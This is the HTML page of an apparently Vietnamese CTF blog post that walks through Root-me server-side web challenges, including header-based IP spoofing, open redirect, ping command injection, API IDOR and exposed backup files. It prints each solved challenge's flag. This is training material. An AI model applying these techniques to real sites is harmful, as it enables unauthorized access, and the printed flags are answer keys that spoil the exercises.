

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Root-me server side - WEB &#39;s challenges - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Root-me server side  HTML - Source code HTTP - IP restriction bypass HTTP - Open redirect HTTP - User-agent Weak password PHP - Command injection API - Broken Access Backup file HTTP - Directory indexing HTTP - Headers HTTP - POST HTTP - Improper redirect HTTP - Verb tampering Install files Nginx - Alias Misconfiguration Nginx - Root Location Misconfiguration API - Mass Assignment CRLF File upload - Double extensions File upload - MIME type Flask - Unsecure session GraphQL - Introspection HTTP - Cookies Insecure Code Management JWT - Introduction XSS - Server Side Directory traversal File upload - Null byte JWT - Revoked token JWT - Weak secret JWT - Unsecure File Signature PHP - assert() PHP - Apache configuration PHP - Filters PHP - register globals PHP - Remote Xdebug Python - Server-side Template Injection Introduction File upload - ZIP Flask - Development server GraphQL - Injection Command injection - Filter bypass Java - Server-side Template Injection JWT - Public key JWT - Header Injection Local File Inclusion Local File Inclusion - Double encoding Node - Eval PHP - Loose Comparison PHP - preg_replace() PHP - type juggling Remote File Inclusion SQL injection - Authentication SQL injection - Authentication - GBK SQL injection - String XSLT - Code execution Elixir - EEx JWT - Unsecure Key Handling LDAP injection - Authentication Node - Serialize NoSQL injection - Authentication PHP - Path Truncation PHP - Serialization SQL injection - Numeric SQL Injection - Routed SQL Truncation XML External Entity XPath injection - Authentication Yaml - Deserialization  CVE-2017-18342   API - Broken Access 2 GraphQL - Backend injection Local File Inclusion - Wrappers PHP - Eval PHP - Eval - Advanced filters bypass Java - Spring Boot SQL injection - Error SQL injection - Insert PHP - SerializationPHP  POC   Deserialization Overflow Deserialization Overflow    .">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-11-14-root-me-server-side\/",
          "name": "Root me server side web \u0027s challenges"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Root-me server side - WEB \u0027s challenges",
  "description" : "Root-me server side  HTML - Source code HTTP - IP restriction bypass HTTP - Open redirect HTTP - User-agent Weak password PHP - Command injection API - Broken Access Backup file HTTP - Directory indexing HTTP - Headers HTTP - POST HTTP - Improper redirect HTTP - Verb tampering Install files Nginx - Alias Misconfiguration Nginx - Root Location Misconfiguration API - Mass Assignment CRLF File upload - Double extensions File upload - MIME type Flask - Unsecure session GraphQL - Introspection HTTP - Cookies Insecure Code Management JWT - Introduction XSS - Server Side Directory traversal File upload - Null byte JWT - Revoked token JWT - Weak secret JWT - Unsecure File Signature PHP - assert() PHP - Apache configuration PHP - Filters PHP - register globals PHP - Remote Xdebug Python - Server-side Template Injection Introduction File upload - ZIP Flask - Development server GraphQL - Injection Command injection - Filter bypass Java - Server-side Template Injection JWT - Public key JWT - Header Injection Local File Inclusion Local File Inclusion - Double encoding Node - Eval PHP - Loose Comparison PHP - preg_replace() PHP - type juggling Remote File Inclusion SQL injection - Authentication SQL injection - Authentication - GBK SQL injection - String XSLT - Code execution Elixir - EEx JWT - Unsecure Key Handling LDAP injection - Authentication Node - Serialize NoSQL injection - Authentication PHP - Path Truncation PHP - Serialization SQL injection - Numeric SQL Injection - Routed SQL Truncation XML External Entity XPath injection - Authentication Yaml - Deserialization  CVE-2017-18342   API - Broken Access 2 GraphQL - Backend injection Local File Inclusion - Wrappers PHP - Eval PHP - Eval - Advanced filters bypass Java - Spring Boot SQL injection - Error SQL injection - Insert PHP - SerializationPHP  POC   Deserialization Overflow Deserialization Overflow    \r\r\r\r\r.",
  "inLanguage" : "en",
  "wordCount":  9711 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-11-14-root-me-server-side\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Root-me server side - WEB &#39;s challenges" />
<meta property="og:description" content="Root-me server side  HTML - Source code HTTP - IP restriction bypass HTTP - Open redirect HTTP - User-agent Weak password PHP - Command injection API - Broken Access Backup file HTTP - Directory indexing HTTP - Headers HTTP - POST HTTP - Improper redirect HTTP - Verb tampering Install files Nginx - Alias Misconfiguration Nginx - Root Location Misconfiguration API - Mass Assignment CRLF File upload - Double extensions File upload - MIME type Flask - Unsecure session GraphQL - Introspection HTTP - Cookies Insecure Code Management JWT - Introduction XSS - Server Side Directory traversal File upload - Null byte JWT - Revoked token JWT - Weak secret JWT - Unsecure File Signature PHP - assert() PHP - Apache configuration PHP - Filters PHP - register globals PHP - Remote Xdebug Python - Server-side Template Injection Introduction File upload - ZIP Flask - Development server GraphQL - Injection Command injection - Filter bypass Java - Server-side Template Injection JWT - Public key JWT - Header Injection Local File Inclusion Local File Inclusion - Double encoding Node - Eval PHP - Loose Comparison PHP - preg_replace() PHP - type juggling Remote File Inclusion SQL injection - Authentication SQL injection - Authentication - GBK SQL injection - String XSLT - Code execution Elixir - EEx JWT - Unsecure Key Handling LDAP injection - Authentication Node - Serialize NoSQL injection - Authentication PHP - Path Truncation PHP - Serialization SQL injection - Numeric SQL Injection - Routed SQL Truncation XML External Entity XPath injection - Authentication Yaml - Deserialization  CVE-2017-18342   API - Broken Access 2 GraphQL - Backend injection Local File Inclusion - Wrappers PHP - Eval PHP - Eval - Advanced filters bypass Java - Spring Boot SQL injection - Error SQL injection - Insert PHP - SerializationPHP  POC   Deserialization Overflow Deserialization Overflow    .">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-11-14-root-me-server-side/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Root-me server side - WEB &#39;s challenges" />
  <meta name="twitter:description" content="Root-me server side  HTML - Source code HTTP - IP restriction bypass HTTP - Open redirect HTTP - User-agent Weak password PHP - Command injection API - Broken Access Backup file HTTP - Directory …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>Root-me server side - WEB &#39;s challenges</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li><a href="#root-me-server-side">Root-me server side</a>
      <ol>
        <li><a href="#html---source-code">HTML - Source code</a></li>
        <li><a href="#http---ip-restriction-bypass">HTTP - IP restriction bypass</a></li>
        <li><a href="#http---open-redirect">HTTP - Open redirect</a></li>
        <li><a href="#http---user-agent">HTTP - User-agent</a></li>
        <li><a href="#weak-password">Weak password</a></li>
        <li><a href="#php---command-injection">PHP - Command injection</a></li>
        <li><a href="#api---broken-access">API - Broken Access</a></li>
        <li><a href="#backup-file">Backup file</a></li>
        <li><a href="#http---directory-indexing">HTTP - Directory indexing</a></li>
        <li><a href="#http---headers">HTTP - Headers</a></li>
        <li><a href="#http---post">HTTP - POST</a></li>
        <li><a href="#http---improper-redirect">HTTP - Improper redirect</a></li>
        <li><a href="#http---verb-tampering">HTTP - Verb tampering</a></li>
        <li><a href="#install-files">Install files</a></li>
        <li><a href="#nginx---alias-misconfiguration">Nginx - Alias Misconfiguration</a></li>
        <li><a href="#nginx---root-location-misconfiguration">Nginx - Root Location Misconfiguration</a></li>
        <li><a href="#api---mass-assignment">API - Mass Assignment</a></li>
        <li><a href="#crlf">CRLF</a></li>
        <li><a href="#file-upload---double-extensions">File upload - Double extensions</a></li>
        <li><a href="#file-upload---mime-type">File upload - MIME type</a></li>
        <li><a href="#flask---unsecure-session">Flask - Unsecure session</a></li>
        <li><a href="#graphql---introspection">GraphQL - Introspection</a></li>
        <li><a href="#http---cookies">HTTP - Cookies</a></li>
        <li><a href="#insecure-code-management">Insecure Code Management</a></li>
        <li><a href="#jwt---introduction">JWT - Introduction</a></li>
        <li><a href="#xss---server-side">XSS - Server Side</a></li>
        <li><a href="#directory-traversal">Directory traversal</a></li>
        <li><a href="#file-upload---null-byte">File upload - Null byte</a></li>
        <li><a href="#jwt---revoked-token">JWT - Revoked token</a></li>
        <li><a href="#jwt---weak-secret">JWT - Weak secret</a></li>
        <li><a href="#jwt---unsecure-file-signature">JWT - Unsecure File Signature</a></li>
        <li><a href="#php---assert">PHP - assert()</a></li>
        <li><a href="#php---apache-configuration">PHP - Apache configuration</a></li>
        <li><a href="#php---filters">PHP - Filters</a></li>
        <li><a href="#php---register-globals">PHP - register globals</a></li>
        <li><a href="#php---remote-xdebug">PHP - Remote Xdebug</a></li>
        <li><a href="#python---server-side-template-injection-introduction">Python - Server-side Template Injection Introduction</a></li>
        <li><a href="#file-upload---zip">File upload - ZIP</a></li>
        <li><a href="#flask---development-server">Flask - Development server</a></li>
        <li><a href="#graphql---injection">GraphQL - Injection</a></li>
        <li><a href="#command-injection---filter-bypass">Command injection - Filter bypass</a></li>
        <li><a href="#java---server-side-template-injection">Java - Server-side Template Injection</a></li>
        <li><a href="#jwt---public-key">JWT - Public key</a></li>
        <li><a href="#jwt---header-injection">JWT - Header Injection</a></li>
        <li><a href="#local-file-inclusion">Local File Inclusion</a></li>
        <li><a href="#local-file-inclusion---double-encoding">Local File Inclusion - Double encoding</a></li>
        <li><a href="#node---eval">Node - Eval</a></li>
        <li><a href="#php---loose-comparison">PHP - Loose Comparison</a></li>
        <li><a href="#php---preg_replace">PHP - preg_replace()</a></li>
        <li><a href="#php---type-juggling">PHP - type juggling</a></li>
        <li><a href="#remote-file-inclusion">Remote File Inclusion</a></li>
        <li><a href="#sql-injection---authentication">SQL injection - Authentication</a></li>
        <li><a href="#sql-injection---authentication---gbk">SQL injection - Authentication - GBK</a></li>
        <li><a href="#sql-injection---string">SQL injection - String</a></li>
        <li><a href="#xslt---code-execution">XSLT - Code execution</a></li>
        <li><a href="#elixir---eex">Elixir - EEx</a></li>
        <li><a href="#jwt---unsecure-key-handling">JWT - Unsecure Key Handling</a></li>
        <li><a href="#ldap-injection---authentication">LDAP injection - Authentication</a></li>
        <li><a href="#node---serialize">Node - Serialize</a></li>
        <li><a href="#nosql-injection---authentication">NoSQL injection - Authentication</a></li>
        <li><a href="#php---path-truncation">PHP - Path Truncation</a></li>
        <li><a href="#php---serialization">PHP - Serialization</a></li>
        <li><a href="#sql-injection---numeric">SQL injection - Numeric</a></li>
        <li><a href="#sql-injection---routed">SQL Injection - Routed</a></li>
        <li><a href="#sql-truncation">SQL Truncation</a></li>
        <li><a href="#xml-external-entity">XML External Entity</a></li>
        <li><a href="#xpath-injection---authentication">XPath injection - Authentication</a></li>
        <li><a href="#yaml---deserialization">Yaml - Deserialization</a>
          <ol>
            <li><a href="#cve-2017-18342">CVE-2017-18342</a></li>
          </ol>
        </li>
        <li><a href="#api---broken-access-2">API - Broken Access 2</a></li>
        <li><a href="#graphql---backend-injection">GraphQL - Backend injection</a></li>
        <li><a href="#local-file-inclusion---wrappers">Local File Inclusion - Wrappers</a></li>
        <li><a href="#php---eval">PHP - Eval</a></li>
        <li><a href="#php---eval---advanced-filters-bypass">PHP - Eval - Advanced filters bypass</a></li>
        <li><a href="#java---spring-boot">Java - Spring Boot</a></li>
        <li><a href="#sql-injection---error">SQL injection - Error</a></li>
        <li><a href="#sql-injection---insert">SQL injection - Insert</a></li>
        <li><a href="#php---serializationphp">PHP - SerializationPHP</a>
          <ol>
            <li><a href="#poc">POC</a></li>
          </ol>
        </li>
        <li><a href="#deserialization-overflow">Deserialization Overflow</a></li>
        <li><a href="#deserialization-overflow-1">Deserialization Overflow</a></li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<h1 id="root-me-server-side">Root-me server side</h1>
<h2 id="html---source-code">HTML - Source code</h2>
<p><img src="https://hackmd.io/_uploads/B1kHlOs1yx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJqHedo1kx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Bywvedskye.png" alt="image"></p>
<p>flag: <code>nZ^&amp;@q5&amp;sjJHev0</code></p>
<h2 id="http---ip-restriction-bypass">HTTP - IP restriction bypass</h2>
<p><img src="https://hackmd.io/_uploads/H1dqedjkJe.png" alt="image"></p>
<p>Nếu người dùng trong mạng nội bộ của công ty thì không cần phải đăng nhập</p>
<p><img src="https://hackmd.io/_uploads/rkbyWdsk1l.png" alt="image"></p>
<p>Có thể thấy ipv6 của ta ở đây (vậy làm sao để bypass cho hệ thống nghĩ mình nằm trong LAN)</p>
<p><img src="https://hackmd.io/_uploads/Hy3L-di11l.png" alt="image"></p>
<p>Mình thử với header <code>X-Forwarded-X: 127.0.0.1</code> -&gt; server thông báo ip mình là 127.0.0.1 nhưng vẫn chưa cùng side với LAN</p>
<p>Đây là các dải ip thuộc mạng LAN</p>
<pre><code>Dải IP 10.0.0.0 đến 10.255.255.255
(Subnet mask: 255.0.0.0)

Dải IP 172.16.0.0 đến 172.31.255.255
(Subnet mask: 255.240.0.0)

Dải IP 192.168.0.0 đến 192.168.255.255
(Subnet mask: 255.255.0.0)
</code></pre><p>Mình đã thử với các giá trị:</p>
<pre><code>192.168.1.1
192.168.0.100
10.0.0.5
172.16.0.10
</code></pre><p>Nhưng vẫn không được -&gt; thử chuyển qua ipv6 vì ban đầu server cũng hiển thị ipv6:</p>
<pre><code>fc00::/7:

Đây là dải địa chỉ được phân bổ cho mạng riêng.
Các địa chỉ trong khoảng từ fc00:: đến fdff:ffff:ffff:ffff:ffff:ffff:ffff
.
fe80::/10:

Đây là dải địa chỉ cho các liên kết cục bộ (link-local addresses), thường được sử dụng để giao tiếp giữa các thiết bị trong cùng một mạng LAN.
Các địa chỉ trong khoảng từ fe80:: đến febf:ffff:ffff:ffff:ffff:ffff:ffff

</code></pre><p>Mình thử với các giá trị này thì nhận được flag</p>
<pre><code>fd00::1
fe80::a00:27ff:fe4e:66d7
fc00::1234:5678:9abc:def0
</code></pre><p><img src="https://hackmd.io/_uploads/ByzxQ_iJ1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJCeQ_j1kl.png" alt="image"></p>
<p>flag: <code>Ip_$po0Fing</code></p>
<h2 id="http---open-redirect">HTTP - Open redirect</h2>
<p><img src="https://hackmd.io/_uploads/rJ8XXuoyyl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkguDQ_sJke.png" alt="image"></p>
<p>Khi ta click vào 1 trong 3 button thì sẽ redirect đến trang tương ứng</p>
<p>Do bài này đề cập đến việc redirect cho nên mình sẽ chặn proxy để kiểm tra</p>
<p><img src="https://hackmd.io/_uploads/HkX5XuoJkx.png" alt="image"></p>
<p>Có một đoạn này trước khi thực hiện redirect:</p>
<p><img src="https://hackmd.io/_uploads/BkzKPdoJ1x.png" alt="image"></p>
<p>có 2 đối số là url và h mình thấy h này khả năng cao là md5 vì nó có 32 bit nhưng crack không thấy gì -&gt; mình đoán h này là của url nên đem vào thử luôn</p>
<p><img src="https://hackmd.io/_uploads/HJGWY_ikJx.png" alt="image"></p>
<p>Đúng như dự đoán h sẽ là hash md5 của url -&gt; mình thử với 1 url khác -&gt; hash nó</p>
<p><img src="https://hackmd.io/_uploads/H10Qt_syJx.png" alt="image"></p>
<p>Có thể đoán đoạn hiện flag là flag not in array url, if(h === md5(url){
echo flag;
})</p>
<p>flag: <code>e6f8a530811d5a479812d7b82fc1a5c5</code></p>
<h2 id="http---user-agent">HTTP - User-agent</h2>
<p><img src="https://hackmd.io/_uploads/SyYMcdiJyg.png" alt="image"></p>
<p>với tiêu đề có thể đoán cần phải đổi user-agent header thành admin để hoàn thành chall.</p>
<p><img src="https://hackmd.io/_uploads/rkQU5uiJ1g.png" alt="image"></p>
<p>flag: <code>rr$Li9%L34qd1AAe27</code></p>
<h2 id="weak-password">Weak password</h2>
<p>Với tiêu đề có vẻ ta phải brute force password</p>
<p><img src="https://hackmd.io/_uploads/Hkz1TdjJke.png" alt="image"></p>
<p>sau khi nhập username và pass thì cookie chứa basic auth</p>
<p><img src="https://hackmd.io/_uploads/Sy_ZT_oykx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryd5-tsJJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SyAs-FjyJe.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJa3ZFo11e.png" alt="image"></p>
<p>flag: <code>admin</code></p>
<h2 id="php---command-injection">PHP - Command injection</h2>
<p>Như tiêu đề thì đây là bài command injection</p>
<p><img src="https://hackmd.io/_uploads/r1V7GYsyJe.png" alt="image"></p>
<p>cần phải đọc file index.php đến hoàn thành bài.</p>
<p><img src="https://hackmd.io/_uploads/BJlDMKs1Jg.png" alt="image"></p>
<p>khi ta nhập 1 ip vào thì nó sẽ ping đến đó và hiển thị kết quả:</p>
<p><img src="https://hackmd.io/_uploads/H1MFGYs1kx.png" alt="image"></p>
<p>có để đoán lệnh command là <code>ping -c $ip</code></p>
<p>-&gt; ta sẽ inject vào bằng nhiều cách có vẻ không filter gì</p>
<p><img src="https://hackmd.io/_uploads/r1jnmtik1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyxRXKjyJl.png" alt="image"></p>
<p>quan sát file <code>$flag = &quot;&quot;.file_get_contents(&quot;.passwd&quot;).&quot;&quot;;</code> biến flag được nhận giá trị là nội dung của .passwd</p>
<p><img src="https://hackmd.io/_uploads/SkofEtjJJl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1LBNtiJke.png" alt="image"></p>
<p>flag: <code>S3rv1ceP1n9Sup3rS3cure</code></p>
<h2 id="api---broken-access">API - Broken Access</h2>
<p><img src="https://hackmd.io/_uploads/B1JxrYjyyx.png" alt="image"></p>
<p>Như tiêu đề ta có thể thấy có swagger thì đây là những hướng dẫn api mà backend thêm vào để khách hàng hay dev front end có thể làm theo để call được api đó.</p>
<p><img src="https://hackmd.io/_uploads/S1ZsSKoy1g.png" alt="image"></p>
<p>đây là cấu trúc swagger cơ bản có các api, và model để nhận và trả dữ liệu</p>
<p><img src="https://hackmd.io/_uploads/Bk7kLYiyye.png" alt="image"></p>
<p>ở đây có 2 api chính là tạo tài khoản, login, trả ra thông tin người dùng, và update note</p>
<p>những api này thêm header token để authentication mới có thể access đến các api trả ra thông tin người dùng, và update note.</p>
<p><img src="https://hackmd.io/_uploads/HyGLLFs11x.png" alt="image"></p>
<p>như dạng trên ta có thể thấy note của họ.</p>
<p><img src="https://hackmd.io/_uploads/BJq7_Kjkkg.png" alt="image"></p>
<p>tạo một tài khoản admin, nhưng tên này đã tồn tại -&gt; tạo tài khoản user và login</p>
<p><img src="https://hackmd.io/_uploads/HyQUdtoJke.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJWudtsJyl.png" alt="image"></p>
<p>Truy cập api user thì thấy note của mình</p>
<p><img src="https://hackmd.io/_uploads/HJ8etYo1Jx.png" alt="image"></p>
<p>Quan sát kĩ, mặc định user_id không được điền, vậy nếu ta thay đổi user_id thì sao:</p>
<p><img src="https://hackmd.io/_uploads/BJ3QtFj1yg.png" alt="image"></p>
<p>thành công nhận flag:</p>
<p>flag: <code>RM{E4sy_1d0r_0n_API}</code></p>
<h2 id="backup-file">Backup file</h2>
<p><img src="https://hackmd.io/_uploads/Sy6ttYi1Je.png" alt="image"></p>
<p>Theo như tên có vẻ chall lộ file back up ở đâu đó</p>
<p>Sau khi recon cơ bản thấy có file backup</p>
<p><img src="https://hackmd.io/_uploads/rJr86Yik1l.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJAFpYok1x.png" alt="image"></p>
